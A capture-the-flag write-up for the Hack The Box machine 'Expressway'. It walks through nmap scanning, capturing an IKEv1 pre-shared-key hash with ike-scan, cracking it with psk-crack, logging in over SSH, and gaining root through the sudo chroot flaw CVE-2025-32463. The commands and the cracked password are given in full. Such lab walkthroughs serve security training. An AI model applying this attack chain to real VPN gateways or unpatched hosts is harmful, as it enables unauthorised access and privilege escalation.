# Hack The Box Write-Up: Expressway 

### 1. Reconnaissance and Enumeration (Footprinting)
The first step was to discover open services and gather initial intelligence on the target machine using nmap.

#### 1.1. Full TCP/UDP Port Scan
An initial aggressive TCP scan (nmap -A) showed only the SSH port open, leading to an immediate pivot to a full UDP scan (nmap -sU) to ensure no critical services were missed.

TCP Scan Output (Abbreviated):

```Bash

$ nmap -A 10.10.11.87

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
UDP Scan Output (Abbreviated):
```
```Bash

$ nmap -sU -p- 10.10.11.87

PORT   STATE SERVICE
500/udp open isakmp
```
####  1.2. Key Findings
The two critical pieces of information gathered were:

Port 22/tcp (SSH): The primary login service. Access requires valid credentials (username and password).

Port 500/udp (ISAKMP): The Internet Security Association and Key Management Protocol, used for setting up IPsec VPN connections. This immediately suggested an attack path involving credential or information leakage.

### 2. Initial Access: IKEv1 PSK Cracking
The path to initial access involved exploiting a weakness in the ISAKMP service on port 500/udp to obtain credentials for SSH login.

#### 2.1. Hashing the IKEv1 Pre-Shared Key (PSK)
The ike-scan tool was used in Aggressive Mode (-A) to force the server to respond with cryptographic data that includes a hash of the Pre-Shared Key (PSK).

```Bash

$ ike-scan -P -M -A -n fakeID 10.10.11.87
```
The output revealed two crucial pieces of data:

Potential Username: ID(Type=ID_USER_FQDN, Value=ike@expressway.htb). This strongly suggested the username ike for the SSH service.

IKE PSK Hash: A long, structured string of data containing all the cryptographic components necessary for an offline brute-force attack.

#### 2.2. Cracking the PSK Hash
The captured hash was saved to ike_hash.txt and cracked using psk-crack and the default Kali Linux wordlist, rockyou.txt.

The psk-crack tool uses the hash components to perform a dictionary attack against the PSK.

Command:

```Bash

$ psk-crack -d /usr/share/wordlists/rockyou.txt ike_hash.txt
```
Result:
```Bash
...
key "freakingrockstarontheroad" matches SHA1 hash 52621694e045042580448144621defd4a75d67c7
...
```
The cracked PSK was determined to be freakingrockstarontheroad.

#### 2.3. SSH Login and User Flag
Using the discovered username (ike) and the cracked PSK as the password, a successful SSH connection was established.

```Bash

$ ssh ike@10.10.11.87
Password: freakingrockstarontheroad

ike@expressway:~$ cat user.txt
## [USER_FLAG_HERE]
```
### 3. Privilege Escalation: CVE-2025-32463 Sudo Exploit
Upon gaining initial access, the primary objective shifted to privilege escalation. A quick file listing in the user's home directory revealed a significant clue.

####  3.1. On-Target Enumeration
The home directory of the ike user contained files explicitly related to a vulnerability and a ready-made exploit:

```Bash

ike@expressway:~$ ls
CVE-2025-32463  exploit.sh  linpeas.sh  user.txt  x.zip
```
The presence of CVE-2025-32463 and an associated exploit.sh script immediately identified the privilege escalation path: a local exploit against the sudo program.

#### 3.2. Sudo Chroot Bypass Vulnerability
The script exploited CVE-2025-32463, a vulnerability in Sudo versions before 1.9.17p1. The flaw is in how Sudo handles the --chroot command:

When a user runs sudo --chroot, Sudo attempts to resolve system names (user/groups) by looking at the configuration files inside the user-controlled chroot directory (/etc/nsswitch.conf).

Crucially, Sudo performs this file lookup before dropping its elevated root privileges.

The exploit.sh script leveraged this by setting up a malicious nsswitch.conf file that forced the root-privileged Sudo process to load a user-controlled dynamic library (libnss_/woot1337.so.2). This library contained simple C code to immediately execute a root shell.

#### 3.3. Execution and Root Access
The exploit was executed directly from the user's home directory:

```Bash

ike@expressway:~$ chmod +x exploit.sh
ike@expressway:~$ ./exploit.sh
woot!
# The terminal prompt changes, indicating success.

# Verify root access
root@expressway:~# whoami
root
```
4. Final Flag Submission
With a root shell successfully obtained, the final step was to retrieve the ultimate proof of compromise.

Command:

```Bash

root@expressway:~# cat /root/root.txt
##The content of the file was the final root flag.
```